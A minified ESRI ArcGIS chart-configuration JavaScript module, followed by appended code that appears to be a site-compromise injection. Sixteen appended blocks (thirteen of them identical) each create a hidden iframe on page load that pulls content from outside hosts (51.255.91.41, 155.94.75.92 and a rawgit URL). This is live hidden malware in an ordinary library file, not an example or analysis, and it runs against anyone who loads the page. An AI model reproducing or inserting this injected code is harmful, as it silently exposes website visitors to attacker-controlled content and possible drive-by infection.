// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["dojo/_base/declare","dojo/_base/lang","./_chartUtils"],function(l,k,h){return l([],{constructor:function(a){this.chart=a.chart;this.gauge=a.gauge},produceOption:function(a){this.chart._theme||(this.chart._theme={});a=k.clone(a);a=this._mockChartDataWhenNoData(a);var b={},b=this._settingDefaultGrid(b,a),b=this._settingRenderOption(b,a),b=this._settingBackgroundColor(b,a),b=this._settingColor(b,a),b=this._settingToolTip(b,a),b=this._settingAxisChartAxis(b,a),b=this._settingRadar(b,a),b=this._settingSeries(b,
a),b=this._settingStack(b,a),b=this._settingArea(b,a),b=this._settingAxisDisplay(b,a),b=this._settingLegend(b,a),b=this._settingScale(b,a),b=this._handleChartRtl(b,a),b=this._pieChartAvoidLegendLabelOverLap(b,a),b=this.settingDataZoom(b,a),b=this._settingGrid(b,a),b=this._settingAdvanceOption(b,a);return b=this._avoidAdjoiningColorSameForPie(b,a)},_mockChartDataWhenNoData:function(a){a&&Array.isArray(a.labels)&&0===a.labels.length&&a.labels.push(0);a&&Array.isArray(a.series)&&0<a.series.length&&a.series.forEach(function(a){a&&
Array.isArray(a.data)&&0===a.data.length&&a.data.push(0)});return a},_settingAdvanceOption:function(a,b){b.advanceOption&&("object"===typeof b.advanceOption?k.mixin(a,b.advanceOption):"function"===typeof b.advanceOption&&b.advanceOption(a));return a},_avoidAdjoiningColorSameForPie:function(a,b){if("pie"!==b.type||!a.color||2>=a.color.length)return a;a.series&&a.series[0]&&a.series.forEach(k.hitch(this,function(b){var c=b.data.length;0===(c-1)%a.color.length&&(b=b.data[c-1],b.itemStyle||(b.itemStyle=
{}),b.itemStyle.normal||(b.itemStyle.normal={}),b.itemStyle.normal.color||(b.itemStyle.normal.color=a.color[1]))}));return a},_settingDefaultGrid:function(a,b){h.isAxisChart(b)&&(a.grid={top:20,bottom:10,left:10,right:10,containLabel:!0});return a},_settingRenderOption:function(a,b){if("curved"===b.shape)return a.animationThreshold=99999999,a.hoverLayerThreshold=99999,a.progressiveThreshold=99999,a;a.hoverLayerThreshold=500;a.progressiveThreshold=500;a.progressive=100;a.animationThreshold=500;return a},
_settingBackgroundColor:function(a,b){b.backgroundColor&&(a.backgroundColor=b.backgroundColor);return a},_settingColor:function(a,b){b.color&&b.color[0]&&(this.chart._theme||(this.chart._theme={}),this.chart._theme.color=b.color,a.color=b.color);return a},_settingToolTip:function(a,b){a.tooltip={};b.confine&&(a.tooltip.confine=!0);if("radar"===b.type)return a.tooltip.trigger="item",a;if(b.axisPointer){if(a.tooltip.trigger="axis","column"===b.type||"bar"===b.type)a.tooltip.axisPointer={type:"shadow"}}else a.tooltip.axisPointer=
{type:""};this.chart._theme.tooltip||(this.chart._theme.tooltip={});var c=!1;"percent"===b.stack&&(c=!0);this.chart._theme.tooltip.formatter=function(a){return h.handleToolTip(a,null,!1,c)}.bind(this);return a},_settingAxisChartAxis:function(a,b){if(!h.isAxisChart(b))return a;a.xAxis={};a.yAxis={};"column"===b.type||"line"===b.type&&b.labels?(a.xAxis.data=b.labels,a.xAxis.type="category",a.yAxis.type="value"):"bar"===b.type&&b.labels&&(a.yAxis.data=b.labels,a.yAxis.type="category",a.xAxis.type="value");
return a},_settingSeries:function(a,b){if("gauge"===b.type)return this.gauge._settingGaugeSeries(a,b);var c=null,e=b.series;e.forEach(function(a){a.type||(a.type=b.type);a.type="column"===b.type?"bar":b.type});e.keek?c=e:(c=[],c=e.map(k.hitch(this,function(a){a.data=a.data.map(k.hitch(this,function(a,c){var d=null;if("funnel"===b.type||"gauge"===b.type||"pie"===b.type)d={},a||"number"===typeof a?(d.value=a.value?a.value:a,a.itemStyle&&(d.itemStyle||(d.itemStyle={}),d.itemStyle=k.mixin(d.itemStyle,
a.itemStyle))):d.value=a,d.name=b.labels[c]||"";else if("column"===b.type||"bar"===b.type||"line"===b.type){if(!a)return a;d=a}this._showBarBorderColor=d&&d.itemStyle&&d.itemStyle.normal&&"undefined"!==typeof d.itemStyle.normal.color&&"line"!==b.type?b.stack?"stack":"single":!1;return d}));a=this._settingPieSerie(a,b);a=this._settingFunnelSerie(a,b);return a=this._settingRaderSerie(a,b)})));a.series=c;return a=this._handleChartBorderWidthColor(a,b)},_settingRaderSerie:function(a,b){if("radar"!==a.type)return a;
var c=b.indicator.map(function(a){return a.name});a.tooltip={};a.tooltip.formatter=function(a){return h.handleToolTip(a,null,!1,!1,c)};return a},_settingFunnelSerie:function(a,b){if("funnel"!==a.type)return a;a.minSize="0%";a.maxSize="100%";a.sort="descending";a.min=b.min||0;a.max=b.max||100;a.max=b.funnelSort||"descending";return a},_settingPieSerie:function(a,b){if("pie"!==a.type)return a;a.selectedMode="single";a.selectedOffset=10;a.hoverOffset=5;a.radius=[0,"70%"];a.labelLine={normal:{show:!0,
length:5,length2:5}};a.labelLine.normal.show="undefined"===typeof b.labelLine?!0:b.labelLine;"number"===typeof b.innerRadius&&(0>b.innerRadius&&(b.innerRadius=0),60<b.innerRadius&&(b.innerRadius=60),a.radius[0]=b.innerRadius+"%");"rose"===b.pieMode&&(a.roseType=b.roseType||"radius");return a=this._absoluteValueForPieChart(a)},_absoluteValueForPieChart:function(a){if(!a||!a.data||!a.data[0])return a;a.data=a.data.map(function(a){"number"===typeof a?a=Math.abs(a):"object"===typeof a&&"number"===typeof a.value&&
(a.value=Math.abs(a.value));return a});return a},_settingRadar:function(a,b){if("radar"!==b.type)return a;a.radar={nameGap:6,radius:"70%"};a.radar.axisLabel={show:!0,formatter:function(){}};b.radarShape&&(a.radar.shape=b.radarShape);b.indicator?(this._handleRadarIndicator(b),a.radar.indicator=b.indicator):console.error("No radar indicator");return a},_handleRadarIndicator:function(a){var b=a.series[0].data,c=[];a.indicator.forEach(function(a,f){if("undefined"!==typeof a.max)return a;c=b.map(function(a){c.push(a.value[f])});
var g=Math.max.apply(Math,c);a.max=g})},_settingStack:function(a,b){if(!h.isAxisChart(b))return a;b=this._stackForPercent(b);if("percent"===b.stack){var c=b.series.some(function(a){return a.data.some(function(a){a=a&&a.value?a.value:a;return"number"===typeof a&&0>a})}),e=b.series.every(function(a){return a.data.every(function(a){a=a&&a.value?a.value:a;return"number"===typeof a&&0>a})}),f=0,g=1;c&&(f=-1,e&&(g=0),"bar"===b.type?(a.xAxis.max=g,a.xAxis.min=f):(a.yAxis.max=g,a.yAxis.min=f))}b.stack&&(a.series=
a.series.map(function(a){a.stack="stack";return a}));return a},_settingArea:function(a,b){if("line"!==b.type||!b.area)return a;a.series=a.series.map(function(a){a.areaStyle||(a.areaStyle={});"undefined"===typeof a.areaStyle.opacity&&(a.areaStyle.opacity=.4);a.sthisoth=!0;a.smoothMonotone="x";return a});return a},_stackForPercent:function(a){if("percent"!==a.stack)return a;var b=[];a.series.forEach(function(a){k.clone(a.data).forEach(function(a,c){b[c]||(b[c]=[]);(a=a&&"undefined"!==typeof a.value?
a.value:a)||(a=0);b[c].push(a)})});var c=[];b.forEach(function(a,b){c[b]||(c[b]=0);a.forEach(function(a){c[b]+=Math.abs(a)})});var e=b.map(function(a,b){return a.map(function(a){return 0===c[b]?null:0<=a?Math.abs(a)/c[b]:-Math.abs(a)/c[b]})});a.series=a.series.map(function(a,b){var c=k.clone(a.data),c=c.map(function(a,c){if(!a)return a;"undefined"!==typeof a.value?a.value=e[c][b]:a=e[c][b];return a});a.data=c;return a});return a},_settingAxisDisplay:function(a,b){if(!h.isAxisChart(b))return a;a.xAxis.show=
!b.hidexAxis;a.yAxis.show=!b.hideyAxis;a.grid.containLabel=!b.hideyAxis;return a},_settingLegend:function(a,b){if(!b.legend)return a.legend={show:!1},a;a.legend={show:!0,type:"scroll",orient:"horizontal",x:"left",pageButtonPosition:"end",pageTextStyle:{color:"#939393"},bottom:20,y:"bottom",data:[]};h.isAxisChart(b)||"gauge"===b.type?a.series.forEach(function(b){a.legend.data.push(b.name)}):"pie"!==b.type&&"funnel"!==b.type&&"radar"!==b.type||a.series[0].data.forEach(function(b){a.legend.data.push(b.name)});
return a=this._handleLegendRTL(a,b)},_handleLegendRTL:function(a,b){if(!b.legend)return a;b={};window.isRTL?(b.x="right",b.pageButtonPosition="start"):(b.x="left",b.pageButtonPosition="end");a.legend=k.mixin(a.legend,b);return a},_settingScale:function(a,b){if(!b.scale)return a;"bar"===b.type?a.xAxis.scale=!0:"line"===b.type||"column"===b.type?a.yAxis.scale=!0:"radar"===b.type&&(a.radar.scale=!0);return a},_handleChartRtl:function(a,b){if(!window.isRTL)return a;if(h.isAxisChart(b)||"vertical"===b.shape||
"horizontal"===b.shape)a.xAxis.inverse=!0,a.yAxis.position="right";return a},_pieChartAvoidLegendLabelOverLap:function(a,b){if("pie"!==b.type)return a;var c=b.labelLine?.75:.85;b.legend&&(c-=.12);a.series[0].radius[1]=100*c+"%";return a},settingDataZoom:function(a,b){if(!h.isAxisChart(b)||!b.series||0===b.series.length)return a;if(b.dataZoom&&0<b.dataZoom.length){var c=this.chart.getWidth(),e=10,f=b.series[0].data.length,g=b.series.length,m=f*g;b.stack&&(m=f);5<=g&&(e=17);f=h.getAxisZeroPosition.call(this,
b);c="bar"!==b.type?window.isRTL?f.left:c-f.left-a.grid.right:f.top;this.showDataZoom=c/m<e;var d=c/(m*e),d=parseFloat(100*d,10).toFixed(3),d=100<d?100:d,d=0===d?.01:d,c=[],n="bar"===b.type?"xAxis":"yAxis",l="bar"===b.type?"yAxisIndex":"xAxisIndex",p="bar"===b.type?"width":"height";a=this._initAxisOfDataZoom(a,n);c=b.dataZoom.map(k.hitch(this,function(a){a={type:a,start:0,show:this.showDataZoom};a[l]=[0];a[p]=15;a.end=d;"xAxis"===n&&window.isRTL&&(a.left="10");return a=this._handleDataZoomPosition(b,
a)}));a.dataZoom=c}else this.showDataZoom=!1,a.dataZoom=[];return a},_initAxisOfDataZoom:function(a,b){a[b].type="value";a.xAxis.splitLine={show:!0,lineStyle:{type:"dashed"}};a.yAxis.splitLine={show:!0,lineStyle:{type:"dashed"}};return a},_handleDataZoomPosition:function(a,b){b.showDataShadow=!1;b.realtime=!1;b.bottom=a.legend?30:20;"bar"===a.type&&a.legend&&(b.bottom=50);return b},_settingGrid:function(a,b){if(!h.isAxisChart(b))return a;a.grid&&(a.grid.top=10);var c=10,e=43;b.hideyAxis&&(c=20,e=
63);var f=0,g=10;b.legend&&(f=this.showDataZoom?10:20,g+=20);"line"===b.type&&b.legend&&!this.showDataZoom&&(c+=7);"bar"===b.type?(window.isRTL?a.grid.left=this.showDataZoom?30:10:a.grid.right=this.showDataZoom?30:10,b.hideyAxis&&b.legend&&(g+=20),a.grid.bottom=g):a.grid.bottom=this.showDataZoom?e+f:c+f;return a},_handleChartBorderWidthColor:function(a,b){var c=0;"single"===this._showBarBorderColor?c=.1:"stack"===this._showBarBorderColor&&(c=1);var e="";"stack"===this._showBarBorderColor&&(e="#fff",
b.backgroundColor&&"transparent"!==b.backgroundColor&&(e=b.backgroundColor));a.series=a.series.map(function(a){if("bar"===a.type||"pie"===a.type)a.itemStyle||(a.itemStyle={}),a.itemStyle.normal||(a.itemStyle.normal={}),a.itemStyle.emphasis||(a.itemStyle.emphasis={}),a.itemStyle.normal.borderWidth=c,a.itemStyle.emphasis.borderWidth=c,e?(a.itemStyle.normal.borderColor=e,a.itemStyle.emphasis.borderColor=e):(a.itemStyle.normal.borderColor="transparent",a.itemStyle.emphasis.borderColor="transparent");
return a});return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});